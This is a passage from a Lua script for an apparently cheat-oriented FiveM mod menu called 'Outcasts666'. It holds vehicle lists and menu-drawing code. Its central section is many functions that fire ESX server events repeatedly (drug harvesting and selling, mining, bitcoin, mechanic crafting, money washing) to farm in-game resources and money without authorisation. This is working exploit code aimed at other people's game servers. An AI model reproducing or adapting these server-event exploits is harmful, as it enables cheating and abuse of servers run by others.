        "Blade", "Buccaneer", "Buccaneer2", "Chino", "Chino2", "clique", "Deviant", "Dominator", "Dominator2", "Dominator3", "Dominator4", "Dominator5", "Dominator6", "Dukes", "Dukes2", "Ellie", "Faction", "faction2", "faction3", "Gauntlet", "Gauntlet2", "Hermes", "Hotknife", "Hustler", "Impaler", "Impaler2", "Impaler3", "Impaler4", "Imperator", "Imperator2", "Imperator3", "Lurcher", "Moonbeam", "Moonbeam2", "Nightshade", "Phoenix", "Picador", "RatLoader", "RatLoader2", "Ruiner", "Ruiner2", "Ruiner3", "SabreGT", "SabreGT2", "Sadler2", "Slamvan", "Slamvan2", "Slamvan3", "Slamvan4", "Slamvan5", "Slamvan6", "Stalion", "Stalion2", "Tampa", "Tampa3", "Tulip", "Vamos,", "Vigero", "Virgo", "Virgo2", "Virgo3", "Voodoo", "Voodoo2", "Yosemite"
    }
    local aL = {
        "BFinjection", "Bifta", "Blazer", "Blazer2", "Blazer3", "Blazer5", "Bohdi", "Brawler", "Bruiser", "Bruiser2", "Bruiser3", "Caracara", "DLoader", "Dune", "Dune2", "Dune3", "Dune4", "Dune5", "Insurgent", "Insurgent2", "Insurgent3", "Kalahari", "Kamacho", "LGuard", "Marshall", "Mesa", "Mesa2", "Mesa3", "Monster", "Monster4", "Monster5", "Nightshark", "RancherXL", "RancherXL2", "Rebel", "Rebel2", "RCBandito", "Riata", "Sandking", "Sandking2", "Technical", "Technical2", "Technical3", "TrophyTruck", "TrophyTruck2", "Freecrawler", "Menacer"
    }
    local aM = {
        "AlphaZ1", "Avenger", "Avenger2", "Besra", "Blimp", "blimp2", "Blimp3", "Bombushka", "Cargoplane", "Cuban800", "Dodo", "Duster", "Howard", "Hydra", "Jet", "Lazer", "Luxor", "Luxor2", "Mammatus", "Microlight", "Miljet", "Mogul", "Molotok", "Nimbus", "Nokota", "Pyro", "Rogue", "Seabreeze", "Shamal", "Starling", "Stunt", "Titan", "Tula", "Velum", "Velum2", "Vestra", "Volatol", "Striekforce"
    }
    local aN = {
        "BJXL", "Baller", "Baller2", "Baller3", "Baller4", "Baller5", "Baller6", "Cavalcade", "Cavalcade2", "Dubsta", "Dubsta2", "Dubsta3", "FQ2", "Granger", "Gresley", "Habanero", "Huntley", "Landstalker", "patriot", "Patriot2", "Radi", "Rocoto", "Seminole", "Serrano", "Toros", "XLS", "XLS2"
    }
    local aO = {
        "Asea", "Asea2", "Asterope", "Cog55", "Cogg552", "Cognoscenti", "Cognoscenti2", "emperor", "emperor2", "emperor3", "Fugitive", "Glendale", "ingot", "intruder", "limo2", "premier", "primo", "primo2", "regina", "romero", "stafford", "Stanier", "stratum", "stretch", "surge", "tailgater", "warrener", "Washington"
    }
    local aP = {
        "Airbus", "Brickade", "Bus", "Coach", "Rallytruck", "Rentalbus", "taxi", "Tourbus", "Trash", "Trash2", "WastIndr", "PBus2"
    }
    local aQ = {
        "Alpha", "Banshee", "Banshee2", "BestiaGTS", "Buffalo", "Buffalo2", "Buffalo3", "Carbonizzare", "Comet2", "Comet3", "Comet4", "Comet5", "Coquette", "Deveste", "Elegy", "Elegy2", "Feltzer2", "Feltzer3", "FlashGT", "Furoregt", "Fusilade", "Futo", "GB200", "Hotring", "Infernus2", "Italigto", "Jester", "Jester2", "Khamelion", "Kurama", "Kurama2", "Lynx", "MAssacro", "MAssacro2", "neon", "Ninef", "ninfe2", "omnis", "Pariah", "Penumbra", "Raiden", "RapidGT", "RapidGT2", "Raptor", "Revolter", "Ruston", "Schafter2", "Schafter3", "Schafter4", "Schafter5", "Schafter6", "Schlagen", "Schwarzer", "Sentinel3", "Seven70", "Specter", "Specter2", "Streiter", "Sultan", "Surano", "Tampa2", "Tropos", "Verlierer2", "ZR380", "ZR3802", "ZR3803"
    }
    local aR = {
        "Ardent", "BType", "BType2", "BType3", "Casco", "Cheetah2", "Cheburek", "Coquette2", "Coquette3", "Deluxo", "Fagaloa", "Gt500", "JB700", "JEster3", "MAmba", "Manana", "Michelli", "Monroe", "Peyote", "Pigalle", "RapidGT3", "Retinue", "Savastra", "Stinger", "Stingergt", "Stromberg", "Swinger", "Torero", "Tornado", "Tornado2", "Tornado3", "Tornado4", "Tornado5", "Tornado6", "Viseris", "Z190", "ZType"
    }
    local aS = {
        "Adder", "Autarch", "Bullet", "Cheetah", "Cyclone", "EntityXF", "Entity2", "FMJ", "GP1", "Infernus", "LE7B", "Nero", "Nero2", "Osiris", "Penetrator", "PFister811", "Prototipo", "Reaper", "SC1", "Scramjet", "Sheava", "SultanRS", "Superd", "T20", "Taipan", "Tempesta", "Tezeract", "Turismo2", "Turismor", "Tyrant", "Tyrus", "Vacca", "Vagner", "Vigilante", "Visione", "Voltic", "Voltic2", "Zentorno", "Italigtb", "Italigtb2", "XA21"
    }
    local aT = {
        "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"
    }
    local aU = {
        "Freight", "Freightcar", "Freightcont1", "Freightcont2", "Freightgrain", "Freighttrailer", "TankerCar"
    }
    local aV = {
        "Airtug", "Caddy", "Caddy2", "Caddy3", "Docktug", "Forklift", "Mower", "Ripley", "Sadler", "Scrap", "TowTruck", "Towtruck2", "Tractor", "Tractor2", "Tractor3", "TrailerLArge2", "Utilitruck", "Utilitruck3", "Utilitruck2"
    }
    local aW = {
        "Bison", "Bison2", "Bison3", "BobcatXL", "Boxville", "Boxville2", "Boxville3", "Boxville4", "Boxville5", "Burrito", "Burrito2", "Burrito3", "Burrito4", "Burrito5", "Camper", "GBurrito", "GBurrito2", "Journey", "Minivan", "Minivan2", "Paradise", "pony", "Pony2", "Rumpo", "Rumpo2", "Rumpo3", "Speedo", "Speedo2", "Speedo4", "Surfer", "Surfer2", "Taco", "Youga", "youga2"
    }
    local aX = {
        "Boats", "Commercial", "Compacts", "Coupes", "Cycles", "Emergency", "Helictopers", "Industrial", "Military", "Motorcycles", "Muscle", "Off-Road", "Planes", "SUVs", "Sedans", "Service", "Sports", "Sports Classic", "Super", "Trailer", "Trains", "Utility", "Vans"
    }
    local aY = {
        aA, aB, aC, aD, aE, aF, aG, aH, aI, aJ, aK, aL, aM, aN, aO, aP, aQ, aR, aS, aT, aU, aV, aW
    }
    
    local slowOutcasts666 = 300968879189131264
    
    function math.round(num, numDecimalPlaces)
        return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
    end
    
    local function RGBRainbow(frequency)
        local result = {}
        local curtime = GetGameTimer() / 1000
    
        result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
        result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
        result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)
    
        return result
    end
    
    local function debugPrint(text)
        if Outcasts666.debug then
            Citizen.Trace('\n[Outcasts666] '..tostring(text))
        end
    end
    
    
    local function setMenuProperty(id, property, value)
        if id and menus[id] then
            menus[id][property] = value
            --debugPrint(id..' menu property changed: { '..tostring(property)..', '..tostring(value)..' }')
        end
    end

function hweed()
    TriggerServerEvent('esx_drugs:startHarvestWeed')
    TriggerServerEvent('esx_drugs:startHarvestWeed')
    TriggerServerEvent('esx_drugs:startHarvestWeed')
    TriggerServerEvent('esx_drugs:startHarvestWeed')
    TriggerServerEvent('esx_drugs:startHarvestWeed')
end

function tweed()
    TriggerServerEvent('esx_drugs:startTransformWeed')
    TriggerServerEvent('esx_drugs:startTransformWeed')
    TriggerServerEvent('esx_drugs:startTransformWeed')
    TriggerServerEvent('esx_drugs:startTransformWeed')
    TriggerServerEvent('esx_drugs:startTransformWeed')
end

function sweed()
    TriggerServerEvent('esx_drugs:startSellWeed')
    TriggerServerEvent('esx_drugs:startSellWeed')
    TriggerServerEvent('esx_drugs:startSellWeed')
    TriggerServerEvent('esx_drugs:startSellWeed')
    TriggerServerEvent('esx_drugs:startSellWeed')
end

function hcoke()
    TriggerServerEvent('esx_drugs:startHarvestCoke')
    TriggerServerEvent('esx_drugs:startHarvestCoke')
    TriggerServerEvent('esx_drugs:startHarvestCoke')
    TriggerServerEvent('esx_drugs:startHarvestCoke')
    TriggerServerEvent('esx_drugs:startHarvestCoke')
end

function tcoke()
    TriggerServerEvent('esx_drugs:startTransformCoke')
    TriggerServerEvent('esx_drugs:startTransformCoke')
    TriggerServerEvent('esx_drugs:startTransformCoke')
    TriggerServerEvent('esx_drugs:startTransformCoke')
    TriggerServerEvent('esx_drugs:startTransformCoke')
end

function scoke()
    TriggerServerEvent('esx_drugs:startSellCoke')
    TriggerServerEvent('esx_drugs:startSellCoke')
    TriggerServerEvent('esx_drugs:startSellCoke')
    TriggerServerEvent('esx_drugs:startSellCoke')
    TriggerServerEvent('esx_drugs:startSellCoke')
end

function hmeth()
    TriggerServerEvent('esx_drugs:startHarvestMeth')
    TriggerServerEvent('esx_drugs:startHarvestMeth')
    TriggerServerEvent('esx_drugs:startHarvestMeth')
    TriggerServerEvent('esx_drugs:startHarvestMeth')
    TriggerServerEvent('esx_drugs:startHarvestMeth')
end

function tmeth()
    TriggerServerEvent('esx_drugs:startTransformMeth')
    TriggerServerEvent('esx_drugs:startTransformMeth')
    TriggerServerEvent('esx_drugs:startTransformMeth')
    TriggerServerEvent('esx_drugs:startTransformMeth')
    TriggerServerEvent('esx_drugs:startTransformMeth')
end

function smeth()
    TriggerServerEvent('esx_drugs:startSellMeth')
    TriggerServerEvent('esx_drugs:startSellMeth')
    TriggerServerEvent('esx_drugs:startSellMeth')
    TriggerServerEvent('esx_drugs:startSellMeth')
    TriggerServerEvent('esx_drugs:startSellMeth')
end

function hopi()
    TriggerServerEvent('esx_drugs:startHarvestOpium')
    TriggerServerEvent('esx_drugs:startHarvestOpium')
    TriggerServerEvent('esx_drugs:startHarvestOpium')
    TriggerServerEvent('esx_drugs:startHarvestOpium')
    TriggerServerEvent('esx_drugs:startHarvestOpium')
end

function topi()
    TriggerServerEvent('esx_drugs:startTransformOpium')
    TriggerServerEvent('esx_drugs:startTransformOpium')
    TriggerServerEvent('esx_drugs:startTransformOpium')
    TriggerServerEvent('esx_drugs:startTransformOpium')
    TriggerServerEvent('esx_drugs:startTransformOpium')
end

function sopi()
    TriggerServerEvent('esx_drugs:startSellOpium')
    TriggerServerEvent('esx_drugs:startSellOpium')
    TriggerServerEvent('esx_drugs:startSellOpium')
    TriggerServerEvent('esx_drugs:startSellOpium')
    TriggerServerEvent('esx_drugs:startSellOpium')
end

function hrock()
    TriggerServerEvent("esx_miner:givestone")
    TriggerServerEvent("esx_miner:givestone")
	TriggerServerEvent("esx_miner:givestone")
	TriggerServerEvent("esx_miner:givestone")
end

function wrock()
    TriggerServerEvent("esx_miner:washing")
    TriggerServerEvent("esx_miner:washing")
	TriggerServerEvent("esx_miner:washing")
	TriggerServerEvent("esx_miner:washing")
end

function mrock()
    TriggerServerEvent("esx_miner:remelting")
    TriggerServerEvent("esx_miner:remelting")
	TriggerServerEvent("esx_miner:remelting")
	TriggerServerEvent("esx_miner:remelting")
end

function scopper()
    TriggerServerEvent("esx_miner:sellcopper")
    TriggerServerEvent("esx_miner:sellcopper")
	TriggerServerEvent("esx_miner:sellcopper")
	TriggerServerEvent("esx_miner:sellcopper")
end

function siron()
    TriggerServerEvent("esx_miner:selliron")
    TriggerServerEvent("esx_miner:selliron")
	TriggerServerEvent("esx_miner:selliron")
	TriggerServerEvent("esx_miner:selliron")
end

function sgold()
    TriggerServerEvent("esx_miner:sellgold")
    TriggerServerEvent("esx_miner:sellgold")
	TriggerServerEvent("esx_miner:sellgold")
	TriggerServerEvent("esx_miner:sellgold")
end

function sdiamonds()
    TriggerServerEvent("esx_miner:selldiamond")
    TriggerServerEvent("esx_miner:selldiamond")
	TriggerServerEvent("esx_miner:selldiamond")
	TriggerServerEvent("esx_miner:selldiamond")
end

function hbtc() 
TriggerServerEvent("esx_bitcoin:startHarvestKoda")
TriggerServerEvent("esx_bitcoin:startHarvestKoda")
TriggerServerEvent("esx_bitcoin:startHarvestKoda")
TriggerServerEvent("esx_bitcoin:startHarvestKoda")
TriggerServerEvent("esx_bitcoin:startHarvestKoda")
end

function stphbtc() 
TriggerServerEvent("esx_bitcoin:stopHarvestKoda")
TriggerServerEvent("esx_bitcoin:stopHarvestKoda")
TriggerServerEvent("esx_bitcoin:stopHarvestKoda")
TriggerServerEvent("esx_bitcoin:stopHarvestKoda")
TriggerServerEvent("esx_bitcoin:stopHarvestKoda")
end

function sllbtc() 
TriggerServerEvent("esx_bitcoin:startSellKoda")
TriggerServerEvent("esx_bitcoin:startSellKoda")
TriggerServerEvent("esx_bitcoin:startSellKoda")
TriggerServerEvent("esx_bitcoin:startSellKoda")
TriggerServerEvent("esx_bitcoin:startSellKoda")
TriggerServerEvent("esx_bitcoin:startSellKoda")
end

function stpsbtc() 
TriggerServerEvent("esx_bitcoin:stopSellKoda")
TriggerServerEvent("esx_bitcoin:stopSellKoda")
TriggerServerEvent("esx_bitcoin:stopSellKoda")
TriggerServerEvent("esx_bitcoin:stopSellKoda")
TriggerServerEvent("esx_bitcoin:stopSellKoda")
end

function hgscan() 
TriggerServerEvent("esx_mechanicjob:startHarvest")
TriggerServerEvent("esx_mechanicjob:startHarvest")
TriggerServerEvent("esx_mechanicjob:startHarvest")
TriggerServerEvent("esx_mechanicjob:startHarvest")
TriggerServerEvent("esx_mechanicjob:startHarvest")
end

function stphgscan() 
TriggerServerEvent("esx_mechanicjob:stopHarvest")
TriggerServerEvent("esx_mechanicjob:stopHarvest")
TriggerServerEvent("esx_mechanicjob:stopHarvest")
TriggerServerEvent("esx_mechanicjob:stopHarvest")
TriggerServerEvent("esx_mechanicjob:stopHarvest")
end

function clkpk() 
TriggerServerEvent("esx_mechanicjob:startCraft")
TriggerServerEvent("esx_mechanicjob:startCraft")
TriggerServerEvent("esx_mechanicjob:startCraft")
TriggerServerEvent("esx_mechanicjob:startCraft")
TriggerServerEvent("esx_mechanicjob:startCraft")
end

function stpsclkpk() 
TriggerServerEvent("esx_mechanicjob:stopCraft")
TriggerServerEvent("esx_mechanicjob:stopCraft")
TriggerServerEvent("esx_mechanicjob:stopCraft")
TriggerServerEvent("esx_mechanicjob:stopCraft")
TriggerServerEvent("esx_mechanicjob:stopCraft")
end

function hrtool() 
TriggerServerEvent("esx_mechanicjob:startHarvest2")
TriggerServerEvent("esx_mechanicjob:startHarvest2")
TriggerServerEvent("esx_mechanicjob:startHarvest2")
TriggerServerEvent("esx_mechanicjob:startHarvest2")
TriggerServerEvent("esx_mechanicjob:startHarvest2")
end

function stphrtool() 
TriggerServerEvent("esx_mechanicjob:stopHarvest2")
TriggerServerEvent("esx_mechanicjob:stopHarvest2")
TriggerServerEvent("esx_mechanicjob:stopHarvest2")
TriggerServerEvent("esx_mechanicjob:stopHarvest2")
TriggerServerEvent("esx_mechanicjob:stopHarvest2")
end

function crkit() 
TriggerServerEvent("esx_mechanicjob:startCraft2")
TriggerServerEvent("esx_mechanicjob:startCraft2")
TriggerServerEvent("esx_mechanicjob:startCraft2")
TriggerServerEvent("esx_mechanicjob:startCraft2")
TriggerServerEvent("esx_mechanicjob:startCraft2")
end

function stpcrkit() 
TriggerServerEvent("esx_mechanicjob:stopCraft2")
TriggerServerEvent("esx_mechanicjob:stopCraft2")
TriggerServerEvent("esx_mechanicjob:stopCraft2")
TriggerServerEvent("esx_mechanicjob:stopCraft2")
TriggerServerEvent("esx_mechanicjob:stopCraft2")
end

function hbtool() 
TriggerServerEvent("esx_mechanicjob:startHarvest3")
TriggerServerEvent("esx_mechanicjob:startHarvest3")
TriggerServerEvent("esx_mechanicjob:startHarvest3")
TriggerServerEvent("esx_mechanicjob:startHarvest3")
TriggerServerEvent("esx_mechanicjob:startHarvest3")
end

function stphbtool() 
TriggerServerEvent("esx_mechanicjob:stopHarvest3")
TriggerServerEvent("esx_mechanicjob:stopHarvest3")
TriggerServerEvent("esx_mechanicjob:stopHarvest3")
TriggerServerEvent("esx_mechanicjob:stopHarvest3")
TriggerServerEvent("esx_mechanicjob:stopHarvest3")
end

function cbkit() 
TriggerServerEvent("esx_mechanicjob:startCraft3")
TriggerServerEvent("esx_mechanicjob:startCraft3")
TriggerServerEvent("esx_mechanicjob:startCraft3")
TriggerServerEvent("esx_mechanicjob:startCraft3")
TriggerServerEvent("esx_mechanicjob:startCraft3")
end

function stpcbkit() 
TriggerServerEvent("esx_mechanicjob:stopCraft3")
TriggerServerEvent("esx_mechanicjob:stopCraft3")
TriggerServerEvent("esx_mechanicjob:stopCraft3")
TriggerServerEvent("esx_mechanicjob:stopCraft3")
TriggerServerEvent("esx_mechanicjob:stopCraft3")
end

function httool() 
TriggerServerEvent("esx_mechanicjob:startHarvest4")
TriggerServerEvent("esx_mechanicjob:startHarvest4")
TriggerServerEvent("esx_mechanicjob:startHarvest4")
TriggerServerEvent("esx_mechanicjob:startHarvest4")
TriggerServerEvent("esx_mechanicjob:startHarvest4")
end

function stphttool() 
TriggerServerEvent("esx_mechanicjob:stopHarvest4")
TriggerServerEvent("esx_mechanicjob:stopHarvest4")
TriggerServerEvent("esx_mechanicjob:stopHarvest4")
TriggerServerEvent("esx_mechanicjob:stopHarvest4")
TriggerServerEvent("esx_mechanicjob:stopHarvest4")
end

function ctkit() 
TriggerServerEvent("esx_mechanicjob:startCraft4")
TriggerServerEvent("esx_mechanicjob:startCraft4")
TriggerServerEvent("esx_mechanicjob:startCraft4")
TriggerServerEvent("esx_mechanicjob:startCraft4")
TriggerServerEvent("esx_mechanicjob:startCraft4")
end

function stpctkit() 
TriggerServerEvent("esx_mechanicjob:stopCraft4")
TriggerServerEvent("esx_mechanicjob:stopCraft4")
TriggerServerEvent("esx_mechanicjob:stopCraft4")
TriggerServerEvent("esx_mechanicjob:stopCraft4")
TriggerServerEvent("esx_mechanicjob:stopCraft4")
end

function htrtool() 
TriggerServerEvent("esx_mechanicjob:startHarvest5")
TriggerServerEvent("esx_mechanicjob:startHarvest5")
TriggerServerEvent("esx_mechanicjob:startHarvest5")
TriggerServerEvent("esx_mechanicjob:startHarvest5")
TriggerServerEvent("esx_mechanicjob:startHarvest5")
end

function stphtrtool() 
TriggerServerEvent("esx_mechanicjob:stopHarvest5")
TriggerServerEvent("esx_mechanicjob:stopHarvest5")
TriggerServerEvent("esx_mechanicjob:stopHarvest5")
TriggerServerEvent("esx_mechanicjob:stopHarvest5")
TriggerServerEvent("esx_mechanicjob:stopHarvest5")
end

function ctrkit() 
TriggerServerEvent("esx_mechanicjob:startCraft5")
TriggerServerEvent("esx_mechanicjob:startCraft5")
TriggerServerEvent("esx_mechanicjob:startCraft5")
TriggerServerEvent("esx_mechanicjob:startCraft5")
TriggerServerEvent("esx_mechanicjob:startCraft5")
end

function stpctrkit() 
TriggerServerEvent("esx_mechanicjob:stopCraft5")
TriggerServerEvent("esx_mechanicjob:stopCraft5")
TriggerServerEvent("esx_mechanicjob:stopCraft5")
TriggerServerEvent("esx_mechanicjob:stopCraft5")
TriggerServerEvent("esx_mechanicjob:stopCraft5")
end

function htntool() 
TriggerServerEvent("esx_mechanicjob:startHarvest6")
TriggerServerEvent("esx_mechanicjob:startHarvest6")
TriggerServerEvent("esx_mechanicjob:startHarvest6")
TriggerServerEvent("esx_mechanicjob:startHarvest6")
TriggerServerEvent("esx_mechanicjob:startHarvest6")
end

function stphtntool()
TriggerServerEvent("esx_mechanicjob:stopHarvest6")
TriggerServerEvent("esx_mechanicjob:stopHarvest6")
TriggerServerEvent("esx_mechanicjob:stopHarvest6")
TriggerServerEvent("esx_mechanicjob:stopHarvest6")
TriggerServerEvent("esx_mechanicjob:stopHarvest6")
end

function ctnkit() 
TriggerServerEvent("esx_mechanicjob:startCraft6")
TriggerServerEvent("esx_mechanicjob:startCraft6")
TriggerServerEvent("esx_mechanicjob:startCraft6")
TriggerServerEvent("esx_mechanicjob:startCraft6")
TriggerServerEvent("esx_mechanicjob:startCraft6")
end

function stpctnkit()
TriggerServerEvent("esx_mechanicjob:stopCraft6")
TriggerServerEvent("esx_mechanicjob:stopCraft6")
TriggerServerEvent("esx_mechanicjob:stopCraft6")
TriggerServerEvent("esx_mechanicjob:stopCraft6")
TriggerServerEvent("esx_mechanicjob:stopCraft6")
end

function mataaspalarufe()
    TriggerServerEvent('esx_blanchisseur:startWhitening', 80)
    TriggerServerEvent('esx_blackmoney:washMoney')
end

function matanumaispalarufe()
    TriggerServerEvent('esx_drugs:stopHarvestCoke')
    TriggerServerEvent('esx_drugs:stopTransformCoke')
    TriggerServerEvent('esx_drugs:stopSellCoke')
    TriggerServerEvent('esx_drugs:stopHarvestMeth')
    TriggerServerEvent('esx_drugs:stopTransformMeth')
    TriggerServerEvent('esx_drugs:stopSellMeth')
    TriggerServerEvent('esx_drugs:stopHarvestWeed')
    TriggerServerEvent('esx_drugs:stopTransformWeed')
    TriggerServerEvent('esx_drugs:stopSellWeed')
    TriggerServerEvent('esx_drugs:stopHarvestOpium')
    TriggerServerEvent('esx_drugs:stopTransformOpium')
    TriggerServerEvent('esx_drugs:stopSellOpium')
    TriggerServerEvent('esx_bitcoin:stopHarvestKoda')
    TriggerServerEvent('esx_bitcoin:stopSellKoda')
    TriggerServerEvent('esx_mechanicjob:stopHarvest2')
    TriggerServerEvent('esx_mechanicjob:stopCraft2')
	TriggerServerEvent("esx_bitcoin:stopHarvestKoda")
    TriggerServerEvent("esx_bitcoin:stopSellKoda")
    TriggerServerEvent("esx_mechanicjob:stopHarvest")
    TriggerServerEvent("esx_mechanicjob:stopCraft")
    TriggerServerEvent("esx_mechanicjob:stopHarvest2")
    TriggerServerEvent("esx_mechanicjob:stopCraft2")
    TriggerServerEvent("esx_mechanicjob:stopHarvest3")
    TriggerServerEvent("esx_mechanicjob:stopCraft3")
    TriggerServerEvent("esx_mechanicjob:stopHarvest4")
    TriggerServerEvent("esx_mechanicjob:stopCraft4")
    TriggerServerEvent("esx_mechanicjob:stopHarvest5")
    TriggerServerEvent("esx_mechanicjob:stopCraft5")
    TriggerServerEvent("esx_mechanicjob:stopHarvest6")
    TriggerServerEvent("esx_mechanicjob:stopCraft6")
end

    local function isMenuVisible(id)
        if id and menus[id] then
            return menus[id].visible
        else
            return false
        end
    end
    
    
    local function setMenuVisible(id, visible, holdCurrent)
        if id and menus[id] then
            setMenuProperty(id, 'visible', visible)
    
            if not holdCurrent and menus[id] then
                setMenuProperty(id, 'currentOption', 1)
            end
    
            if visible then
                if id ~= currentMenu and isMenuVisible(currentMenu) then
                    setMenuVisible(currentMenu, false)
                end
    
                currentMenu = id
            end
        end
    end
    
    
    local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
        SetTextColour(color.r, color.g, color.b, color.a)
        SetTextFont(font)
        SetTextScale(scale, scale)
    
        if shadow then
            SetTextDropShadow(2, 2, 0, 0, 0)
        end
    
        if menus[currentMenu] then
            if center then
                SetTextCentre(center)
            elseif alignRight then
                SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
                SetTextRightJustify(true)
            end
        end
    
        Citizen.InvokeNative("0x25FBB336DF1804CB", "STRING")
        Citizen.InvokeNative("0x6C188BE134E074AA", text)
        Citizen.InvokeNative("0xCD015E5BB0D96A57", x, y)
    end
    
    
    local function drawRect(x, y, width, height, color)
        DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
    end
    
    
    local function drawTitle()
        if menus[currentMenu] then
            local x = menus[currentMenu].x + menus[currentMenu].width / 2
            local y = menus[currentMenu].y + titleHeight / 2
    
            if menus[currentMenu].titleBackgroundSprite then
                DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., menus[currentMenu].spriteColor.r, menus[currentMenu].spriteColor.g, menus[currentMenu].spriteColor.b, menus[currentMenu].spriteColor.a)
            else
                drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
            end
    
            drawText(menus[currentMenu].title, x, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
        end
    end
    
    
    local function drawSubTitle()
        if menus[currentMenu] then
            local x = menus[currentMenu].x + menus[currentMenu].width / 2
            local y = menus[currentMenu].y + titleHeight + buttonHeight / 2
    
            local subTitleColor = { r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255 }
    
            drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
            drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)
    
            if optionCount > menus[currentMenu].maxOptionCount then
                drawText(tostring(menus[currentMenu].currentOption)..' / '..tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true)
            end
        end
    end
    
    
    local function drawButton(text, subText)
        local x = menus[currentMenu].x + menus[currentMenu].width / 2
        local multiplier = nil
    
        if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
            multiplier = optionCount
        elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
            multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
        end
    
        if multiplier then
            local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
            local backgroundColor = nil
            local textColor = nil
            local subTextColor = nil
            local shadow = false
    
            if menus[currentMenu].currentOption == optionCount then
                backgroundColor = menus[currentMenu].menuFocusBackgroundColor
                textColor = menus[currentMenu].menuFocusTextColor
                subTextColor = menus[currentMenu].menuFocusTextColor
            else
                backgroundColor = menus[currentMenu].menuBackgroundColor
                textColor = menus[currentMenu].menuTextColor
                subTextColor = menus[currentMenu].menuSubTextColor
                shadow = true
            end
    
            drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
            drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)
    
            if subText then
                drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true)
            end
        end
    end
    
    
    function Outcasts666.CreateMenu(id, title)
        -- Default settings
    
        menus[id] = { }
        menus[id].title = title
        menus[id].subTitle = 'Outcasts666'
    
        menus[id].visible = false
    
        menus[id].previousMenu = nil
    
        menus[id].aboutToBeClosed = false
    
        menus[id].x = 0.025
        menus[id].y = 0.025
        menus[id].width = 0.23
    
        menus[id].currentOption = 1
        menus[id].maxOptionCount = 10
    
        menus[id].titleFont = 1
        menus[id].titleColor = { r = 255, g = 255, b = 255, a = 255 }
        menus[id].titleBackgroundColor = { r = 255, g = 255, b = 255, a = 255 }
        menus[id].titleBackgroundSprite = nil
        menus[id].spriteColor = { r = 255, g = 0, b = 0, a = 255 }
    
        menus[id].menuTextColor = { r = 255, g = 255, b = 255, a = 255 }
        menus[id].menuSubTextColor = { r = 255, g = 255, b = 255, a = 255 }
        menus[id].menuFocusTextColor = { r = 0, g = 0, b = 0, a = 255 }
        menus[id].menuFocusBackgroundColor = { r = 255, g = 255, b = 255, a = 255 }
        menus[id].menuBackgroundColor = { r = 30, g = 30, b = 30, a = 150 }
    
        menus[id].subTitleBackgroundColor = { r = menus[id].menuBackgroundColor.r, g = menus[id].menuBackgroundColor.g, b = menus[id].menuBackgroundColor.b, a = 255 }
    
        menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" } --https://pastebin.com/0neZdsZ5
        --debugPrint(tostring(id)..' menu created')
    end
    
    
    function Outcasts666.CreateSubMenu(id, parent, subTitle)
        if menus[parent] then
            Outcasts666.CreateMenu(id, menus[parent].title)
    
            if subTitle then
                setMenuProperty(id, 'subTitle', string.upper(subTitle))
            else
                setMenuProperty(id, 'subTitle', string.upper(menus[parent].subTitle))
            end
    
            setMenuProperty(id, 'previousMenu', parent)
    
            setMenuProperty(id, 'x', menus[parent].x)
            setMenuProperty(id, 'y', menus[parent].y)
            setMenuProperty(id, 'maxOptionCount', menus[parent].maxOptionCount)
            setMenuProperty(id, 'titleFont', menus[parent].titleFont)
            setMenuProperty(id, 'titleColor', menus[parent].titleColor)
            setMenuProperty(id, 'titleBackgroundColor', menus[parent].titleBackgroundColor)
            setMenuProperty(id, 'titleBackgroundSprite', menus[parent].titleBackgroundSprite)
            setMenuProperty(id, 'menuTextColor', menus[parent].menuTextColor)
            setMenuProperty(id, 'menuSubTextColor', menus[parent].menuSubTextColor)
            setMenuProperty(id, 'menuFocusTextColor', menus[parent].menuFocusTextColor)
            setMenuProperty(id, 'menuFocusBackgroundColor', menus[parent].menuFocusBackgroundColor)
            setMenuProperty(id, 'menuBackgroundColor', menus[parent].menuBackgroundColor)
            setMenuProperty(id, 'subTitleBackgroundColor', menus[parent].subTitleBackgroundColor)
        else
            debugPrint('Failed to create '..tostring(id)..' submenu: '..tostring(parent)..' parent menu doesn\'t exist')
        end
    end
    
    
    function Outcasts666.CurrentMenu()
        return currentMenu
    end
    
    
    function Outcasts666.OpenMenu(id)
        if id and menus[id] then
            PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
